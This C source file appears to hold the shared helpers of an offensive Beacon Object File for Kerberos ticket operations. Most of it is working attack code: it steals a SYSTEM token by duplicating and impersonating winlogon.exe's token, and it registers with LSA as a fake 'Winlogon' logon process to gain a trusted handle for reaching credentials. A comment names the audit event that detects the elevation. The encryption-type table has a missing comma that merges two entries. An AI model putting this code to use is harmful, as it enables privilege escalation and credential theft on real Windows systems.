#include "common.h"
#include <stdint.h>

HANDLE GetCurrentToken(DWORD DesiredAccess)
{
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken((HANDLE)-2, DesiredAccess, FALSE, &hCurrentToken))
    {
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN)
        {
            if (!ADVAPI32$OpenProcessToken((HANDLE)-1, DesiredAccess, &hCurrentToken))
            {
                return NULL;
            }
        }
    }
    return hCurrentToken;
}

void GetEncryptionTypeString(LONG encType, char **encTypeString)
{
    char *types[27] = {
        "reserved0",
        "des_cbc_crc",
        "des_cbc_md4",
        "des_cbc_md5",
        "reserved1",
        "des3_cbc_md5",
        "reserved2",
        "des3_cbc_sha1",
        "(8)"
        "dsaWithSHA1_CmsOID",
        "md5WithRSAEncryption_CmsOID",
        "sha1WithRSAEncryption_CmsOID",
        "rc2CBC_EnvOID",
        "rsaEncryption_EnvOID",
        "rsaES_OAEP_ENV_OID",
        "des_ede3_cbc_Env_OID",
        "des3_cbc_sha1_kd",
        "aes128_cts_hmac_sha1_96",
        "aes256_cts_hmac_sha1_96",
        "aes128_cts_hmac_sha256_128",
        "aes256_cts_hmac_sha384_192",
        "(21)",
        "(22)",
        "rc4_hmac",
        "rc4_hmac_exp",
        "camellia128_cts_cmac",
        "camellia256_cts_cmac"};

    *encTypeString = MSVCRT$malloc(32 * sizeof(char));
    if (*encTypeString == NULL)
    {
        return NULL;
    }

    for (int i = 0; i < 27; i++)
    {
        if (i == encType)
        {
            _strcpy(*encTypeString, types[i]);
            return;
        }
    }

    if (encType == SUBKEY_KEYMATERIAL)
    {
        _strcpy(*encTypeString, "subkey_keymaterial\0");
        return;
    }

    _strcpy(*encTypeString, "(unknown)\0");
}

SYSTEMTIME ConvertToSystemtime(LARGE_INTEGER li)
{
    FILETIME ft;
    SYSTEMTIME st_utc;
    ft.dwHighDateTime = li.HighPart;
    ft.dwLowDateTime = li.LowPart;
    KERNEL32$FileTimeToSystemTime(&ft, &st_utc);
    return st_utc;
}

BOOL IsHighIntegrity()
{
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    b = ADVAPI32$AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0,
                                          0, 0, 0, 0, &AdministratorsGroup);

    if (b)
    {
        if (!ADVAPI32$CheckTokenMembership(NULL, AdministratorsGroup, &b))
        {
            b = FALSE;
        }
        ADVAPI32$FreeSid(AdministratorsGroup);
    }

    return b;
}

BOOL IsSystem()
{
    HANDLE hToken;
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid;
    BOOL bSystem;

    if (!ADVAPI32$OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken))
    {
        return FALSE;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser))
    {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid))
        return FALSE;

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);
    ADVAPI32$FreeSid(pSystemSid);
    return bSystem;
}

NTSTATUS GetLsaHandle(BOOL highIntegrity, HANDLE *hLsa)
{
    HANDLE hLsaLocal;
    LSA_OPERATIONAL_MODE mode = 0;
    NTSTATUS status = STATUS_SUCCESS;
    if (!highIntegrity)
    {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
        if (!NT_SUCCESS(status))
        {
            status = ADVAPI32$LsaNtStatusToWinError(status);
        }
    }
    else
    {
        // AuditPol.exe /set /subcategory:"Security System Extension"
        // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
        // winlogon.exe.
        char *name = "Winlogon";
        STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
        SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
        if (hLsaLocal == NULL)
        {
            if (IsSystem())
            {
                status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
                if (!NT_SUCCESS(status))
                {
                    status = ADVAPI32$LsaNtStatusToWinError(status);
                }
            }
            else
            {
                if (ElevateToSystem())
                {
                    status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
                    if (!NT_SUCCESS(status))
                    {
                        status = ADVAPI32$LsaNtStatusToWinError(status);
                    }
                    ADVAPI32$RevertToSelf();
                }
                else
                {
                    status = KERNEL32$GetLastError();
                }
            }
        }
    }

    *hLsa = hLsaLocal;
    return status;
}

int GetProcessIdByName(WCHAR *processName)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    int pid = -1;

    hProcessSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return pid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!KERNEL32$Process32FirstW(hProcessSnap, &pe32))
    {
        KERNEL32$CloseHandle(hProcessSnap);
        return pid;
    }

    do
    {
        WCHAR *procName = pe32.szExeFile;
        if (_wcscmp(procName, processName) == 0)
        {
            pid = pe32.th32ProcessID;
            break;
        }

    } while (KERNEL32$Process32NextW(hProcessSnap, &pe32));
    KERNEL32$CloseHandle(hProcessSnap);
    return pid;
}

BOOL ElevateToSystem()
{
    int pid = GetProcessIdByName(L"winlogon.exe");
    if (pid == -1)
    {
        return FALSE;
    }
    BOOL res = FALSE;
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess != NULL)
    {
        HANDLE hDupToken;
        HANDLE hToken;
        if (ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
        {
            if (hToken != NULL)
            {
                if (ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
                {
                    if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken))
                    {
                        res = TRUE;
                    }
                    KERNEL32$CloseHandle(hDupToken);
                }
                KERNEL32$CloseHandle(hToken);
            }
        }

        KERNEL32$CloseHandle(hProcess);
    }
    return res;
}

WCHAR *GetWideString(char *src)
{
    int len = _strlen(src);
    WCHAR *dest = (WCHAR *)MSVCRT$calloc(len + 1, sizeof(WCHAR));
    if (dest == NULL)
    {
        return NULL;
    }
    MSVCRT$mbstowcs(dest, src, len);
    return dest;
}

/*
 * NTDLL string functions
 *
 * Copyright 2000 Alexandre Julliard
 * Copyright 2000 Jon Griffiths
 * Copyright 2003 Thomas Mertes
 *
 */

unsigned int _strlen(const char *str)
{
    const char *s = str;
    while (*s)
        s++;
    return s - str;
}

int _strcmp(const char *str1, const char *str2)
{
    while (*str1 && *str1 == *str2)
    {
        str1++;
        str2++;
    }
    if ((unsigned char)*str1 > (unsigned char)*str2)
        return 1;
    if ((unsigned char)*str1 < (unsigned char)*str2)
        return -1;
    return 0;
}

char *_strcpy(char *dst, const char *src)
{
    char *d = dst;
    while ((*d++ = *src++))
        ;
    return dst;
}

char *_strstr(const char *str, const char *sub)
{
    while (*str)
    {
        const char *p1 = str, *p2 = sub;
        while (*p1 && *p2 && *p1 == *p2)
        {
            p1++;
            p2++;
        }
        if (!*p2)
            return (char *)str;
        str++;
    }
    return NULL;
}

void *_memcpy(void *dst, const void *src, size_t n)
{
    volatile unsigned char *d = dst; /* avoid gcc optimizations */
    const unsigned char *s = src;

    if ((size_t)dst - (size_t)src >= n)
    {
        while (n--)
            *d++ = *s++;
    }
    else
    {
        d += n - 1;
        s += n - 1;
        while (n--)
            *d-- = *s--;
    }
    return dst;
}

int _memcmp(const void *ptr1, const void *ptr2, size_t n)
{
    const unsigned char *p1, *p2;

    for (p1 = ptr1, p2 = ptr2; n; n--, p1++, p2++)
    {
        if (*p1 < *p2)
            return -1;
        if (*p1 > *p2)
            return 1;
    }
    return 0;
}

static inline void _memset_aligned_32(unsigned char *d, uint64_t v, size_t n)
{
    unsigned char *end = d + n;
    while (d < end)
    {
        *(uint64_t *)(d + 0) = v;
        *(uint64_t *)(d + 8) = v;
        *(uint64_t *)(d + 16) = v;
        *(uint64_t *)(d + 24) = v;
        d += 32;
    }
}

void *_memset(void *dst, int c, size_t n)
{
    typedef uint64_t DECLSPEC_ALIGN(1) unaligned_ui64;
    typedef uint32_t DECLSPEC_ALIGN(1) unaligned_ui32;
    typedef uint16_t DECLSPEC_ALIGN(1) unaligned_ui16;

    uint64_t v = 0x101010101010101ull * (unsigned char)c;
    unsigned char *d = (unsigned char *)dst;
    size_t a = 0x20 - ((uintptr_t)d & 0x1f);

    if (n >= 16)
    {
        *(unaligned_ui64 *)(d + 0) = v;
        *(unaligned_ui64 *)(d + 8) = v;
        *(unaligned_ui64 *)(d + n - 16) = v;
        *(unaligned_ui64 *)(d + n - 8) = v;
        if (n <= 32)
            return dst;
        *(unaligned_ui64 *)(d + 16) = v;
        *(unaligned_ui64 *)(d + 24) = v;
        *(unaligned_ui64 *)(d + n - 32) = v;
        *(unaligned_ui64 *)(d + n - 24) = v;
        if (n <= 64)
            return dst;

        n = (n - a) & ~0x1f;
        _memset_aligned_32(d + a, v, n);
        return dst;
    }
    if (n >= 8)
    {
        *(unaligned_ui64 *)d = v;
        *(unaligned_ui64 *)(d + n - 8) = v;
        return dst;
    }
    if (n >= 4)
    {
        *(unaligned_ui32 *)d = v;
        *(unaligned_ui32 *)(d + n - 4) = v;
        return dst;
    }
    if (n >= 2)
    {
        *(unaligned_ui16 *)d = v;
        *(unaligned_ui16 *)(d + n - 2) = v;
        return dst;
    }
    if (n >= 1)
    {
        *(uint8_t *)d = v;
        return dst;
    }
    return dst;
}

/*
 * NTDLL wide-char functions
 *
 * Copyright 2000 Alexandre Julliard
 * Copyright 2000 Jon Griffiths
 * Copyright 2003 Thomas Mertes
 */

unsigned int _wcslen(LPCWSTR str)
{
    const WCHAR *s = str;
    while (*s)
        s++;
    return s - str;
}

int _wcscmp(LPCWSTR str1, LPCWSTR str2)
{
    while (*str1 && (*str1 == *str2))
    {
        str1++;
        str2++;
    }
    return *str1 - *str2;
}

HRESULT __stdcall _StringCchPrintfExA(STRSAFE_LPSTR pszDest, size_t cchDest, STRSAFE_LPSTR *ppszDestEnd, size_t *pcchRemaining, unsigned __LONG32 dwFlags, STRSAFE_LPCSTR pszFormat, ...)
{
    HRESULT hr;
    va_list argList;
    if (cchDest > STRSAFE_MAX_CCH)
        return STRSAFE_E_INVALID_PARAMETER;
    va_start(argList, pszFormat);
    hr = _StringVPrintfExWorkerA(pszDest, cchDest, cchDest, ppszDestEnd, pcchRemaining, dwFlags, pszFormat, argList);
    va_end(argList);
    return hr;
}

HRESULT __stdcall _StringVPrintfExWorkerA(STRSAFE_LPSTR pszDest, size_t cchDest, size_t cbDest, STRSAFE_LPSTR *ppszDestEnd, size_t *pcchRemaining, unsigned __LONG32 dwFlags, STRSAFE_LPCSTR pszFormat, va_list argList)
{
    HRESULT hr = S_OK;
    STRSAFE_LPSTR pszDestEnd = pszDest;
    size_t cchRemaining = 0;
    if (dwFlags & (~STRSAFE_VALID_FLAGS))
        hr = STRSAFE_E_INVALID_PARAMETER;
    else
    {
        if (dwFlags & STRSAFE_IGNORE_NULLS)
        {
            if (!pszDest)
            {
                if ((cchDest != 0) || (cbDest != 0))
                    hr = STRSAFE_E_INVALID_PARAMETER;
            }
            if (!pszFormat)
                pszFormat = "";
        }
        if (SUCCEEDED(hr))
        {
            if (cchDest == 0)
            {
                pszDestEnd = pszDest;
                cchRemaining = 0;
                if (*pszFormat != '\0')
                {
                    if (!pszDest)
                        hr = STRSAFE_E_INVALID_PARAMETER;
                    else
                        hr = STRSAFE_E_INSUFFICIENT_BUFFER;
                }
            }
            else
            {
                int iRet;
                size_t cchMax;
                cchMax = cchDest - 1;
                iRet = MSVCRT$_vsnprintf(pszDest, cchMax, pszFormat, argList);
                if ((iRet < 0) || (((size_t)iRet) > cchMax))
                {
                    pszDestEnd = pszDest + cchMax;
                    cchRemaining = 1;
                    *pszDestEnd = '\0';
                    hr = STRSAFE_E_INSUFFICIENT_BUFFER;
                }
                else if (((size_t)iRet) == cchMax)
                {
                    pszDestEnd = pszDest + cchMax;
                    cchRemaining = 1;
                    *pszDestEnd = '\0';
                }
                else if (((size_t)iRet) < cchMax)
                {
                    pszDestEnd = pszDest + iRet;
                    cchRemaining = cchDest - iRet;
                    if (dwFlags & STRSAFE_FILL_BEHIND_NULL)
                    {
                        _memset(pszDestEnd + 1, STRSAFE_GET_FILL_PATTERN(dwFlags), ((cchRemaining - 1) * sizeof(char)) + (cbDest % sizeof(char)));
                    }
                }
            }
        }
    }
    if (FAILED(hr))
    {
        if (pszDest)
        {
            if (dwFlags & STRSAFE_FILL_ON_FAILURE)
            {
                _memset(pszDest, STRSAFE_GET_FILL_PATTERN(dwFlags), cbDest);
                if (STRSAFE_GET_FILL_PATTERN(dwFlags) == 0)
                {
                    pszDestEnd = pszDest;
                    cchRemaining = cchDest;
                }
                else if (cchDest > 0)
                {
                    pszDestEnd = pszDest + cchDest - 1;
                    cchRemaining = 1;
                    *pszDestEnd = '\0';
                }
            }
            if (dwFlags & (STRSAFE_NULL_ON_FAILURE | STRSAFE_NO_TRUNCATION))
            {
                if (cchDest > 0)
                {
                    pszDestEnd = pszDest;
                    cchRemaining = cchDest;
                    *pszDestEnd = '\0';
                }
            }
        }
    }
    if (SUCCEEDED(hr) || (hr == STRSAFE_E_INSUFFICIENT_BUFFER))
    {
        if (ppszDestEnd)
            *ppszDestEnd = pszDestEnd;
        if (pcchRemaining)
            *pcchRemaining = cchRemaining;
    }
    return hr;
}
